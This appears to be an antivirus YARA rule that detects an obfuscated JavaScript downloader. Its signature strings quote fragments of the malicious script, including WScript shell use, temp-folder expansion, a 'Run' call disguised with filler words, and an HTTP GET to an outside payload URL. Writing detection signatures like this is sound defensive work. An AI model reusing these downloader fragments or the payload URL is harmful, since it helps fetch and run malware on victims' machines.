rule sig_20160428_772f4e9c268cbd2af2a1d46b7c68a8b3 {
  meta:
    description = "datamaliciousorder - file 20160428_772f4e9c268cbd2af2a1d46b7c68a8b3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e97693b643a53b8fe2940a71097520005e394546db4c26800104c7a416b182f4"

  strings:
    $s1  = "function YbsEjdIoqUwvAjvNqkCea(WlkFxyFhgSsfHbwLhlUql){OacNspEliWcpHybZfvUsw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function LbeShtKvuSwxQbiFrcHhx() {return OacNspEliWcpHybZfvUsw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "var OacNspEliWcpHybZfvUsw = function AflPumCxcEfkNwbGyeYmd() {return LdlIcwKblMzwCjjAigDjr[UxjVnwWssRzwHoiHboAue](\"WScript\"+\"" ascii
    $s4  = "return QjtZfrLmjJneHbgVrjOnb - SbkCvjGymTurYyaYfuCgm;};" fullword ascii
    $s5  = "JvbSbtYloFvnBjaHszGfc[LhtYmbIuxFooKlyIfzWtv](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s6  = "var OacNspEliWcpHybZfvUsw = function AflPumCxcEfkNwbGyeYmd() {return LdlIcwKblMzwCjjAigDjr[UxjVnwWssRzwHoiHboAue](\"WScript\"+\"" ascii
    $s7  = "var LdlIcwKblMzwCjjAigDjr = this[\"WScript\"];" fullword ascii
    $s8  = "function LbeShtKvuSwxQbiFrcHhx() {return OacNspEliWcpHybZfvUsw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "}while (UbiRcgPjpEnqDpuOshIao);" fullword ascii
    $s10 = "function YbsEjdIoqUwvAjvNqkCea(WlkFxyFhgSsfHbwLhlUql){OacNspEliWcpHybZfvUsw[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s11 = "function VrkEviAnjJfyKlvKcyXye(){return VkoApaAkwWvcRhqMhvEwv + \"\";};" fullword ascii
    $s12 = "function YfrAgmBuuJgtCaoDokJcu(QjtZfrLmjJneHbgVrjOnb, SbkCvjGymTurYyaYfuCgm){HftZqdLjdUkaWjcAwyHic = HftZqdLjdUkaWjcAwyHic * 1; " ascii
    $s13 = "if (JvbSbtYloFvnBjaHszGfc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function UseWfvSbkBakOkgDrySfn() {return ((VejMdjLqlAmzBqwGqgUdd == true) && (VejMdjLqlAmzBqwGqgUdd == AmwEtjNkdCimAslXylCrx)) ?" ascii
    $s15 = "function IzsXmbXwyOnqBjxIzrNcs(){return UxjVnwWssRzwHoiHboAue;};" fullword ascii
    $s16 = "function YfrAgmBuuJgtCaoDokJcu(QjtZfrLmjJneHbgVrjOnb, SbkCvjGymTurYyaYfuCgm){HftZqdLjdUkaWjcAwyHic = HftZqdLjdUkaWjcAwyHic * 1; " ascii
    $s17 = "AmwEtjNkdCimAslXylCrx = true; " fullword ascii
    $s18 = "var AmwEtjNkdCimAslXylCrx = false;" fullword ascii
    $s19 = "function TpcVvzYxnFwkYqpRdmInn(){return 23;};" fullword ascii
    $s20 = "var VejMdjLqlAmzBqwGqgUdd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}